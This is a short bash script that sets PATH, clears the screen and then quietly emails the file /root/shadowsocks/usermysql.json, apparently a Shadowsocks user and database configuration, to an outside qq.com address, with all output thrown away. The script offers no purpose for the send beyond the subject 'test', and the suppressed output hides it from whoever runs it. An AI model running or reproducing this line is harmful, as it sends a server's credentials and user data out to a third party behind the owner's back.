#!/bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH 
clear; 
mail -s test 1755739617@qq.com < /root/shadowsocks/usermysql.json >/dev/null 2>&1